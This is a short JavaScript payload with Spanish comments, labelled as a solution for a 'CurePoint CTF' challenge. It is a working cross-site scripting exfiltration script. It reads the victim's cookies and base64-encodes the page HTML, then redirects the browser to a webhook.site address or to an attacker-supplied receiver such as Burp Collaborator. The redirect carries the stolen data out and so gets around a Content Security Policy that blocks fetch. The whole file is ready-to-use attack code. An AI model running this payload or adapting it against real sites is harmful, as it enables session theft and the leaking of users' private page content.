/* CurePoint CTF — exfil por navegación (CSP bloquea fetch).
 * ?w=URL de receptor HTTPS, p.ej. Burp Collaborator: https://TU_ID.burpcollaborator.net
 * u oastify en Burp reciente. Sin ?w= usa el fallback de abajo. */
(function () {
  var WH = "https://webhook.site/af75be10-0cbe-4fc8-843e-2dc8c15d14ed";
  try {
    var w = new URLSearchParams(window.location.search).get("w");
    if (w && /^https?:\/\//i.test(w)) WH = w;
  } catch (e) {}
  var c = "";
  try {
    c = document.cookie;
  } catch (e) {
    c = String(e);
  }
  var h = "";
  try {
    h = document.documentElement ? document.documentElement.outerHTML : "";
    if (h.length > 3500) h = h.slice(0, 3500);
    h = btoa(unescape(encodeURIComponent(h)));
    if (h.length > 4000) h = h.slice(0, 4000);
  } catch (e) {
    h = btoa(String(e));
  }
  window.location =
    WH +
    "?c=" +
    encodeURIComponent(c) +
    "&t=" +
    encodeURIComponent(document.title || "") +
    "&d=" +
    encodeURIComponent(h);
})();
